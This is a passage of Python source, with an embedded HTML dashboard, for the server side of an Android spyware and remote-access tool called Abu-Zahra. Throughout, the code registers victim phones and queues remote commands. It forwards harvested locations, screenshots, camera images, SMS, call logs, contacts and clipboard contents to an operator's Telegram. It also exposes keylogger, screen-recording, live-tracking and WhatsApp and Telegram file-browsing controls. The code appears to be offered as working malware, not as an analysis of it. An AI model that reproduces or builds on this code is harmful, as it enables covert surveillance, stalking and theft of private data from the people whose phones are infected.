                    else:
                        await answer_callback_query(cb_id, f"أمر غير معروف: {cmd_name}", show_alert=True)
                    matched = True
                    break
            if not matched:
                await answer_callback_query(cb_id, "جهاز غير معروف", show_alert=True)
            return

        # ── Direct cmd_ buttons (from device menu) ──
        if data.startswith("cmd_"):
            remainder = data[4:]  # Remove "cmd_"
            matched = False
            for d in get_devices():
                did = d["id"]
                if remainder.endswith(f"_{did}"):
                    cmd_name = remainder[:-len(f"_{did}")]
                    reg = COMMAND_REGISTRY.get(cmd_name)
                    if reg:
                        await execute_device_command(chat_id, did, reg["cmd"], msg_id=message_id)
                    matched = True
                    break
            if matched:
                await answer_callback_query(cb_id)
            else:
                await answer_callback_query(cb_id, "خطأ في تنفيذ الأمر", show_alert=True)
            return

        # ── Server actions ──
        if data == "srv_status":
            await handle_status(chat_id)
            await answer_callback_query(cb_id)
            return
        if data == "srv_stats":
            devices = get_devices()
            online = sum(1 for d in devices if d.get("active"))
            cmds = load_json(COMMANDS_FILE, [])
            pending = sum(1 for c in cmds if c.get("status") == "pending")
            text = f"📈 الإحصائيات: {len(devices)} أجهزة ({online} متصل), {pending} أوامر معلّقة, {messages_sent} رسالة مرسلة"
            await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_logs":
            events = load_json(EVENTS_FILE, [])[-15:]
            text = "📝 <b>السجلات الأخيرة</b>\n\n"
            for e in events:
                text += f"[{e.get('time','')[:16]}] {e.get('event','')}\n"
            await edit_message_text(chat_id, message_id, text[:4000], reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_settings":
            s = load_settings()
            await edit_message_text(chat_id, message_id, f"⚙️ <b>الإعدادات</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_cleardata":
            save_json(COMMANDS_FILE, [])
            save_json(EVENTS_FILE, [])
            await edit_message_text(chat_id, message_id, "✅ تم مسح البيانات", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "تم مسح البيانات")
            return
        if data == "srv_backup":
            append_event("Backup created")
            await edit_message_text(chat_id, message_id, "✅ تم إنشاء نسخة احتياطية", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_setpass":
            await edit_message_text(chat_id, message_id, "🔑 <b>تغيير كلمة المرور</b>\n\nأرسل /password <كلمة_المرور_الجديدة>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_addadmin":
            await edit_message_text(chat_id, message_id, "➕ <b>إضافة أدمن</b>\n\nأرسل /addadmin <chat_id>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_broadcast":
            await edit_message_text(chat_id, message_id, "📢 <b>إرسال عام</b>\n\nأرسل /broadcast <الرسالة>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_export":
            devices = get_devices()
            export_data = {"devices": devices, "settings": load_settings(), "commands": load_json(COMMANDS_FILE, [])}
            export_text = json.dumps(export_data, ensure_ascii=False, indent=2)[:4000]
            await edit_message_text(chat_id, message_id, f"📤 <b>تصدير البيانات</b>\n\n<code>{export_text}</code>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "تم التصدير")
            return
        if data == "srv_import":
            await edit_message_text(chat_id, message_id, "📥 <b>استيراد البيانات</b>\n\nأرسل ملف JSON يحتوي على البيانات", reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return
        if data == "srv_restart":
            await edit_message_text(chat_id, message_id, "🔄 <b>جاري إعادة تشغيل البوت...</b>", reply_markup=build_server_menu())
            await answer_callback_query(cb_id, "جاري إعادة التشغيل")
            try:
                import subprocess
                subprocess.Popen(["systemctl", "restart", "abu-zahra-bot.service"])
            except Exception:
                os._exit(0)
            return
        if data == "srv_maintenance":
            await edit_message_text(chat_id, message_id, "🔧 <b>الصيانة</b>\n\n✅ النظام يعمل بشكل طبيعي\n📊 وقت التشغيل: " + format_uptime(get_uptime()), reply_markup=build_server_menu())
            await answer_callback_query(cb_id)
            return

        # ── Menu category navigation (opens first device submenu) ──
        if data.startswith("menu_"):
            cat = data[5:]
            d = get_first_device()
            dev_id = d["id"] if d else "none"
            if not d:
                await answer_callback_query(cb_id, "لا يوجد جهاز مربوط", show_alert=True)
                return
            
            menu_map = {
                "data": ("📊 جمع البيانات", build_data_submenu),
                "social": ("🌐 التواصل الاجتماعي", build_social_submenu),
                "control": ("🎮 التحكم عن بعد", build_control_submenu),
                "apps": ("📦 إدارة التطبيقات", build_apps_submenu),
                "files": ("📂 إدارة الملفات", build_files_submenu),
                "security": ("🔒 الأمان", build_security_submenu),
                "monitor": ("🔍 المراقبة", build_monitor_submenu),
                "syssettings": ("⚙️ إعدادات النظام", build_syssettings_submenu),
            }
            if cat in menu_map:
                label, builder = menu_map[cat]
                await edit_message_text(chat_id, message_id, f"{label} - <b>{d.get('name', dev_id)}</b>", reply_markup=builder(dev_id))
                await answer_callback_query(cb_id)
                return

        await answer_callback_query(cb_id)
    except Exception as exc:
        log.error("Callback error: %s - %s", exc, traceback.format_exc())
        await answer_callback_query(cb_id, "خطأ", show_alert=True)

# ============================================================================
# REST API ENDPOINTS
# ============================================================================

async def api_verify_link(request):
    """POST /api/verify_link - Verify link code, register device, notify admin."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        code = body.get("code", "").upper().strip()
        device_id = body.get("device_id", "")
        model = body.get("model", "")
        brand = body.get("brand", "")
        android = body.get("android", "")

        if not code:
            return web.json_response({"ok": False, "error": "Code required"}, status=400)

        result = await verify_link_code(code)
        if not result["ok"]:
            return web.json_response(result, status=400)

        # === تسجيل الجهاز مباشرة عند التحقق ===
        device_token = secrets.token_urlsafe(32)
        device_data = {
            "id": device_id,
            "token": device_token,
            "active": True,
            "name": model or device_id,
            "model": model,
            "brand": brand,
            "os": f"Android {android}",
            "battery": "",
            "network": "",
            "location": "",
        }
        add_device(device_data)
        await consume_link_code(code, device_id)

        # === إشعار الأدمن بأن جهاز جديد تم ربطه ===
        try:
            await send_admin(
                f"📱 <b>تم ربط جهاز جديد!</b>\n\n"
                f"🔑 كود الربط: <code>{code}</code>\n"
                f"🆔 معرف الجهاز: <code>{device_id}</code>\n"
                f"📱 الموديل: <b>{model}</b>\n"
                f"🏢 الشركة: <b>{brand}</b>\n"
                f"🤖 أندرويد: <b>{android}</b>\n\n"
                f"✅ الجهاز متصل ومستعد لاستقبال الأوامر"
            )
        except Exception as e:
            log.error("Failed to notify admin: %s", e)

        return web.json_response({
            "ok": True,
            "device_token": device_token,
            "server_domain": SERVER_DOMAIN,
            "message": "Device linked successfully",
        })
    except Exception as exc:
        log.error("verify_link error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_register(request):
    """POST /api/register - Register device with server."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        link_code = body.get("link_code", "").upper().strip()
        device_token = body.get("device_token", "")
        device_info = body.get("device_info", {})
        
        if not device_id or not link_code:
            return web.json_response({"ok": False, "error": "device_id and link_code required"}, status=400)
        
        # Verify code again
        result = await verify_link_code(link_code)
        if not result["ok"]:
            return web.json_response(result, status=400)
        
        # Register device
        device_data = {
            "id": device_id,
            "token": device_token or secrets.token_urlsafe(32),
            "active": True,
            "name": device_info.get("name", device_id),
            "model": device_info.get("model", ""),
            "os": device_info.get("os", ""),
            "battery": device_info.get("battery", ""),
            "network": device_info.get("network", ""),
            "location": device_info.get("location", ""),
        }
        add_device(device_data)
        await consume_link_code(link_code, device_id)
        
        # Notify admin
        await send_admin(
            f"📱 <b>New Device Linked!</b>\n\n"
            f"📱 Name: <code>{device_data['name']}</code>\n"
            f"🆔 ID: <code>{device_id}</code>\n"
            f"📱 Model: <code>{device_data['model']}</code>\n"
            f"🤖 OS: <code>{device_data['os']}</code>",
            reply_markup=build_main_menu()
        )
        
        return web.json_response({
            "ok": True,
            "device_id": device_id,
            "token": device_data["token"],
            "message": "Device registered successfully",
        })
    except Exception as exc:
        log.error("register error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_get_commands(request):
    """GET /api/commands/{device_id} - Get pending commands."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    if not device_id:
        device_id = request.query.get("device_id", "")
    
    if not device_id:
        return web.json_response({"ok": False, "error": "device_id required"}, status=400)
    
    # Verify device
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
    
    pending = get_pending_commands(device_id)
    
    # Mark as sent
    commands = load_json(COMMANDS_FILE, [])
    for c in commands:
        if c.get("device_id") == device_id and c.get("status") == "pending":
            c["status"] = "sent"
            c["sent_at"] = ts()
    save_json(COMMANDS_FILE, commands)
    
    # Update last seen
    update_device(device_id, {"active": True})
    
    return web.json_response({
        "ok": True,
        "commands": pending,
        "count": len(pending),
        "server_time": ts(),
    })


async def api_command_result(request):
    """POST /api/command_result/{command_id} - Submit command result.
    Also supports query param: POST /api/command_result?command_id=X"""
    global api_hits
    api_hits += 1
    cmd_id = request.match_info.get("command_id", "")
    if not cmd_id:
        cmd_id = request.query.get("command_id", "")
    log.info("Command result received for cmd_id=%s from %s", cmd_id, request.remote)
    try:
        body = await request.json()
        status = body.get("status", "completed")
        result = body.get("result")
        
        updated = update_command_status(cmd_id, status, result)
        if not updated:
            return web.json_response({"ok": False, "error": "Command not found"}, status=404)
        
        # Forward result to admin
        cmd_name = updated.get("command", "")
        device_id = updated.get("device_id", "")
        d = find_device(device_id)
        dev_name = d.get("name", device_id) if d else device_id
        
        result_text = str(result)[:3000] if result else "\u0644\u0627 \u062a\u0648\u062c\u062f \u0628\u064a\u0627\u0646\u0627\u062a"
        await send_admin(
            f"✅ <b>Command Result</b>\n\n"
            f"📱 Device: <code>{dev_name}</code>\n"
            f"📋 Command: <code>{cmd_name}</code>\n"
            f"🆔 ID: <code>{cmd_id}</code>\n"
            f"📊 Status: <code>{status}</code>\n\n"
            f"📦 Result:\n<code>{result_text}</code>",
            disable_notification=True
        )
        
        return web.json_response({"ok": True, "message": "Result received"})
    except Exception as exc:
        log.error("command_result error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_device_data(request):
    """POST /api/data/{device_id} - Receive data from device."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    log.info("Device data received from device_id=%s", device_id)
    try:
        body = await request.json()
        data_type = body.get("type", "")
        data = body.get("data", {})
        
        d = find_device(device_id)
        if not d:
            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
        
        dev_name = d.get("name", device_id)
        update_device(device_id, {"active": True})
        
        # Handle different data types
        if data_type == "location":
            lat = data.get("lat", "")
            lon = data.get("lon", "")
            update_device(device_id, {"location": f"{lat},{lon}"})
            await send_admin(
                f"📍 <b>Location Update</b>\n"
                f"📱 {dev_name}\n"
                f"🗺️ <a href='https://maps.google.com/?q={lat},{lon}'>View Map</a>",
                disable_notification=True
            )
        elif data_type == "battery":
            level = data.get("level", "?")
            update_device(device_id, {"battery": level})
        elif data_type == "screenshot" or data_type == "camera":
            img_data = data.get("image", "")
            if img_data and len(img_data) > 100:
                import base64
                try:
                    await send_photo(ADMIN_CHAT_ID, base64.b64decode(img_data),
                                     caption=f"📷 {data_type} from {dev_name}")
                except:
                    await send_admin(f"📷 {data_type} from {dev_name}\n(Image data received)", disable_notification=True)
        else:
            # Generic data forward
            data_str = json.dumps(data, ensure_ascii=False)[:3000] if data else "Empty"
            await send_admin(
                f"📦 <b>Data Received</b>\n"
                f"📱 {dev_name}\n"
                f"📋 Type: <code>{data_type}</code>\n\n"
                f"<code>{data_str}</code>",
                disable_notification=True
            )
        
        append_event(f"Data received: {data_type}", {"device_id": device_id})
        
        return web.json_response({"ok": True, "message": "Data received"})
    except Exception as exc:
        log.error("device_data error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def api_device_settings(request):
    """GET /api/settings/{device_id} - Get device settings."""
    global api_hits
    api_hits += 1
    device_id = request.match_info.get("device_id", "")
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
    
    settings = load_settings()
    return web.json_response({
        "ok": True,
        "settings": {
            "sync_interval": settings.get("sync_interval", 300),
            "location_interval": settings.get("location_interval", 60),
            "auto_location": settings.get("auto_location", True),
            "auto_sync": settings.get("auto_sync", True),
            "keylogger": settings.get("keylogger", False),
            "notifications": settings.get("notifications", True),
        }
    })


async def api_web_login(request):
    """POST /api/login - Web dashboard login."""
    global api_hits
    api_hits += 1
    try:
        body = await request.json()
        username = body.get("username", "admin")
        password = body.get("password", "")
        ip = request.remote or ""
        ua = request.headers.get("User-Agent", "")
        
        session = create_session(username, password, ip, ua)
        if not session:
            return web.json_response({"ok": False, "error": "Invalid credentials"}, status=401)
        
        return web.json_response({
            "ok": True,
            "token": session["token"],
            "expires_at": session["expires_at"],
        })
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


def require_auth(func):
    """Decorator to require valid session token."""
    async def wrapper(request, *args, **kwargs):
        global api_hits
        api_hits += 1
        auth = request.headers.get("Authorization", "")
        token = auth.replace("Bearer ", "") if auth.startswith("Bearer ") else ""
        if not token:
            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
        session = validate_session(token)
        if not session:
            return web.json_response({"ok": False, "error": "Session expired"}, status=401)
        request["session"] = session
        return await func(request, *args, **kwargs)
    return wrapper


@require_auth
async def api_web_devices(request):
    devices = get_devices()
    return web.json_response({"ok": True, "devices": devices})


@require_auth
async def api_web_device_detail(request):
    device_id = request.match_info.get("device_id", "")
    d = find_device(device_id)
    if not d:
        return web.json_response({"ok": False, "error": "Not found"}, status=404)
    cmds = load_json(COMMANDS_FILE, [])
    device_cmds = [c for c in cmds if c.get("device_id") == device_id][-50:]
    return web.json_response({"ok": True, "device": d, "commands": device_cmds})


@require_auth
async def api_web_commands(request):
    commands = load_json(COMMANDS_FILE, [])
    return web.json_response({"ok": True, "commands": commands[-100:]})


@require_auth
async def api_web_events(request):
    events = load_json(EVENTS_FILE, [])
    return web.json_response({"ok": True, "events": events[-100:]})


@require_auth
async def api_web_stats(request):
    devices = get_devices()
    online = sum(1 for d in devices if d.get("active"))
    cmds = load_json(COMMANDS_FILE, [])
    pending = sum(1 for c in cmds if c.get("status") == "pending")
    completed = sum(1 for c in cmds if c.get("status") == "completed")
    events = load_json(EVENTS_FILE, [])
    return web.json_response({
        "ok": True,
        "stats": {
            "uptime": get_uptime(),
            "uptime_formatted": format_uptime(get_uptime()),
            "devices_total": len(devices),
            "devices_online": online,
            "commands_total": len(cmds),
            "commands_pending": pending,
            "commands_completed": completed,
            "messages_sent": messages_sent,
            "api_hits": api_hits,
            "events_total": len(events),
            "total_registered_commands": len(COMMAND_REGISTRY),
            "server_time": ts(),
            "port": SERVER_PORT,
            "domain": SERVER_DOMAIN,
        }
    })


@require_auth
async def api_web_send_command(request):
    try:
        body = await request.json()
        device_id = body.get("device_id", "")
        command = body.get("command", "")
        params = body.get("params", {})
        
        if not device_id or not command:
            return web.json_response({"ok": False, "error": "device_id and command required"}, status=400)
        
        d = find_device(device_id)
        if not d:
            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
        
        cmd = queue_command(device_id, command, params)
        return web.json_response({"ok": True, "command": cmd})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


@require_auth
async def api_web_link_code(request):
    entry = await generate_link_code()
    return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})


@require_auth
async def api_web_settings_get(request):
    settings = load_settings()
    return web.json_response({"ok": True, "settings": settings})


@require_auth
async def api_web_settings_set(request):
    try:
        body = await request.json()
        settings = load_settings()
        for key, value in body.items():
            if key in settings:
                settings[key] = value
        save_settings_data(settings)
        return web.json_response({"ok": True})
    except Exception as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


@require_auth
async def api_web_unlink(request):
    device_id = request.match_info.get("device_id", "")
    if remove_device(device_id):
        return web.json_response({"ok": True})
    return web.json_response({"ok": False, "error": "Not found"}, status=404)

# ============================================================================
# WEB DASHBOARD HTML
# ============================================================================

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Abu-Zahra Dashboard</title>
<style>
:root{--bg:#0a0a0f;--surface:#12121a;--surface2:#1a1a2e;--border:#2a2a3e;--text:#e0e0e0;--text2:#888;--accent:#e63946;--accent2:#ff6b6b;--green:#4ade80;--blue:#60a5fa;--yellow:#fbbf24;--purple:#a78bfa;--radius:12px}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e)}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px;width:360px;max-width:90vw;text-align:center}
.login-box h1{color:var(--accent);margin-bottom:8px;font-size:24px}
.login-box p{color:var(--text2);margin-bottom:24px;font-size:14px}
.login-box input{width:100%;padding:12px 16px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border .2s}
.login-box input:focus{border-color:var(--accent)}
.login-box button{width:100%;padding:12px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background .2s;font-weight:bold}
.login-box button:hover{background:var(--accent2)}
.login-error{color:var(--accent);font-size:13px;margin-top:8px;display:none}
.app{display:none;min-height:100vh}
.sidebar{position:fixed;top:0;right:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:20px 0;z-index:100;transition:transform .3s}
.sidebar .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px}
.sidebar .logo h2{color:var(--accent);font-size:18px}
.sidebar .logo span{color:var(--text2);font-size:11px}
.sidebar a{display:flex;align-items:center;padding:12px 20px;color:var(--text2);text-decoration:none;transition:all .2s;cursor:pointer;font-size:14px;gap:10px}
.sidebar a:hover,.sidebar a.active{background:var(--surface2);color:var(--text)}
.sidebar a.active{border-right:3px solid var(--accent);color:var(--accent)}
.main{margin-right:240px;padding:24px;min-height:100vh}
.page{display:none}
.page.active{display:block}
.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.topbar h1{font-size:22px;font-weight:600}
.topbar .time{color:var(--text2);font-size:13px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px}
.stat-card .label{color:var(--text2);font-size:13px;margin-bottom:8px}
.stat-card .value{font-size:28px;font-weight:700}
.stat-card .sub{color:var(--text2);font-size:12px;margin-top:4px}
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px}
.card h3{margin-bottom:16px;font-size:16px;display:flex;align-items:center;gap:8px}
table{width:100%;border-collapse:collapse}
th,td{padding:10px 12px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
th{color:var(--text2);font-weight:500}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
.badge-green{background:#166534;color:var(--green)}
.badge-red{background:#7f1d1d;color:#fca5a5}
.badge-yellow{background:#713f12;color:var(--yellow)}
.badge-blue{background:#1e3a5f;color:var(--blue)}
.btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:13px;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{background:var(--accent2)}
.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
.btn-sm{padding:6px 12px;font-size:12px}
.btn-danger{background:#7f1d1d;color:#fca5a5}
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px}
.cmd-btn{padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all .2s;text-align:right}
.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.1)}
.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;cursor:pointer;transition:all .2s}
.device-card:hover{border-color:var(--accent);transform:translateY(-2px)}
.device-card .name{font-size:16px;font-weight:600;margin-bottom:4px}
.device-card .meta{color:var(--text2);font-size:12px}
.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
.log-item .time{color:var(--text2);white-space:nowrap;font-family:monospace}
.log-item .event{flex:1}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center}
.modal-overlay.show{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:500px;max-width:90vw;max-height:80vh;overflow-y:auto}
.modal h2{margin-bottom:16px;font-size:18px}
.search-box{display:flex;gap:8px;margin-bottom:16px}
.search-box input{flex:1;padding:10px 14px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:14px;outline:none}
.hamburger{display:none;position:fixed;top:16px;right:16px;z-index:150;background:var(--accent);color:#fff;border:none;width:40px;height:40px;border-radius:8px;font-size:20px;cursor:pointer}
@media(max-width:768px){
.sidebar{transform:translateX(100%)}
.sidebar.open{transform:translateX(0)}
.main{margin-right:0;padding:16px;padding-top:60px}
.hamburger{display:block}
.stats-grid{grid-template-columns:repeat(2,1fr)}
.device-cards{grid-template-columns:1fr}
.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.empty{text-align:center;color:var(--text2);padding:40px;font-size:14px}
.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
.tab{padding:8px 16px;border-radius:8px;border:1px solid var(--border);background:transparent;color:var(--text2);cursor:pointer;font-size:13px;transition:all .2s}
.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 20px;z-index:300;transform:translateX(-400px);transition:transform .3s;font-size:14px}
.notification.show{transform:translateX(0)}
.command-log .cmd-item{padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--surface2)}
.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;margin-bottom:6px}
</style>
</head>
<body>
<div class="login-page" id="loginPage">
<div class="login-box">
<h1>🟥 Abu-Zahra</h1>
<p>Control Dashboard</p>
<input type="text" id="loginUser" placeholder="Username" value="admin">
<input type="password" id="loginPass" placeholder="Password">
<button onclick="doLogin()">Login</button>
<div class="login-error" id="loginError">Invalid credentials</div>
</div>
</div>

<button class="hamburger" id="hamburger" onclick="toggleSidebar()">☰</button>

<div class="app" id="app">
<nav class="sidebar" id="sidebar">
<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.0</span></div>
<a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
<a onclick="showPage('devices')">📱 Devices</a>
<a onclick="showPage('commands')">🎮 Commands</a>
<a onclick="showPage('files')">📂 Files</a>
<a onclick="showPage('data')">📦 Data</a>
<a onclick="showPage('monitor')">🔍 Monitor</a>
<a onclick="showPage('settings')">⚙️ Settings</a>
<a onclick="showPage('logs')">📝 Logs</a>
<a onclick="doLogout()">🚪 Logout</a>
</nav>
<div class="main">

<div class="page active" id="page-dashboard">
<div class="topbar"><h1>📊 Dashboard</h1><span class="time" id="clock"></span></div>
<div class="stats-grid" id="statsGrid"></div>
<div class="card"><h3>📱 Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
<div class="card"><h3>📋 Recent Commands</h3><div id="dashCommands"></div></div>
</div>

<div class="page" id="page-devices">
<div class="topbar"><h1>📱 Devices</h1><button class="btn btn-primary" onclick="generateLink()">🔗 Link Device</button></div>
<div id="linkCodeBox" style="display:none" class="card"><h3>🔗 Link Code</h3><p id="linkCodeText" style="font-size:24px;font-weight:bold;text-align:center;color:var(--accent)"></p></div>
<div class="device-cards" id="deviceList"></div>
<div class="card" id="deviceDetail" style="display:none"></div>
</div>

<div class="page" id="page-commands">
<div class="topbar"><h1>🎮 Command Center</h1></div>
<div class="card"><h3>Send Command</h3>
<div class="search-box"><select id="cmdDevice" style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select></div>
<div class="tabs" id="cmdTabs"></div>
<div class="cmd-grid" id="cmdGrid"></div>
</div>
<div class="card"><h3>Command Log</h3><div id="cmdLog" class="command-log"></div></div>
</div>

<div class="page" id="page-files">
<div class="topbar"><h1>📂 File Browser</h1></div>
<div class="card"><h3>Select device to browse files</h3>
<select id="fileDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
<div class="cmd-grid" style="margin-top:12px">
<button class="cmd-btn" onclick="sendCmd('list_downloads')">📥 Downloads</button>
<button class="cmd-btn" onclick="sendCmd('list_dcim')">📸 DCIM</button>
<button class="cmd-btn" onclick="sendCmd('list_music')">🎵 Music</button>
<button class="cmd-btn" onclick="sendCmd('list_videos')">🎬 Videos</button>
<button class="cmd-btn" onclick="sendCmd('list_documents')">📁 Documents</button>
<button class="cmd-btn" onclick="sendCmd('list_whatsapp')">💬 WhatsApp</button>
<button class="cmd-btn" onclick="sendCmd('list_telegram_files')">✈️ Telegram</button>
<button class="cmd-btn" onclick="sendCmd('recent_files')">🕐 Recent</button>
</div></div>
</div>

<div class="page" id="page-data">
<div class="topbar"><h1>📦 Data Viewer</h1></div>
<div class="card"><h3>Quick Data</h3>
<select id="dataDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
<div class="cmd-grid">
<button class="cmd-btn" onclick="sendDataCmd('sms')">📲 SMS</button>
<button class="cmd-btn" onclick="sendDataCmd('calls')">📞 Calls</button>
<button class="cmd-btn" onclick="sendDataCmd('contacts')">📇 Contacts</button>
<button class="cmd-btn" onclick="sendDataCmd('location')">📍 Location</button>
<button class="cmd-btn" onclick="sendDataCmd('notifications')">🔔 Notifications</button>
<button class="cmd-btn" onclick="sendDataCmd('clipboard')">📋 Clipboard</button>
<button class="cmd-btn" onclick="sendDataCmd('battery')">🔋 Battery</button>
<button class="cmd-btn" onclick="sendDataCmd('info')">ℹ️ Device Info</button>
</div></div>
</div>

<div class="page" id="page-monitor">
<div class="topbar"><h1>🔍 Monitoring</h1></div>
<div class="card"><h3>Monitor Controls</h3>
<select id="monDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
<div class="cmd-grid">
<button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">⌨️ Start Keylogger</button>
<button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">⏹ Stop Keylogger</button>
<button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">📥 Get Keys</button>
<button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">🔴 Start Screen Record</button>
<button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">⏹ Stop Screen Record</button>
<button class="cmd-btn" onclick="sendMonCmd('location_live')">🗺️ Live Location</button>
<button class="cmd-btn" onclick="sendMonCmd('location_stop')">⏹ Stop Tracking</button>
<button class="cmd-btn" onclick="sendMonCmd('location_history')">📜 Location History</button>
<button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">📲 SMS Monitor</button>
<button class="cmd-btn" onclick="sendMonCmd('call_monitor')">📞 Call Monitor</button>
</div></div>
</div>

<div class="page" id="page-settings">
<div class="topbar"><h1>⚙️ Settings</h1></div>
<div class="card"><h3>Server Settings</h3>
<div id="settingsForm"></div>
<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">💾 Save</button></div>
</div>

<div class="page" id="page-logs">
<div class="topbar"><h1>📝 Event Logs</h1><button class="btn btn-secondary btn-sm" onclick="loadEvents()">🔄 Refresh</button></div>
<div class="card"><div id="eventLog"></div></div>
</div>

</div></div>

<div class="notification" id="notif"></div>

<script>
let TOKEN=localStorage.getItem('az_token')||'';
let POLL_INTERVAL=null;
let DEVICES=[];

function notify(msg,color='var(--green)'){
const n=document.getElementById('notif');
n.textContent=msg;n.style.borderColor=color;n.classList.add('show');
setTimeout(()=>n.classList.remove('show'),3000);
}

function api(path,opts={}){
return fetch('/api/'+path,{
headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
...opts
}).then(r=>r.json());
}

async function doLogin(){
const u=document.getElementById('loginUser').value;
const p=document.getElementById('loginPass').value;
const r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
else{document.getElementById('loginError').style.display='block';}
}

function doLogout(){
TOKEN='';localStorage.removeItem('az_token');
document.getElementById('app').style.display='none';
document.getElementById('loginPage').style.display='flex';
if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
}

function showApp(){
document.getElementById('loginPage').style.display='none';
document.getElementById('app').style.display='block';
loadAll();
POLL_INTERVAL=setInterval(loadAll,5000);
}

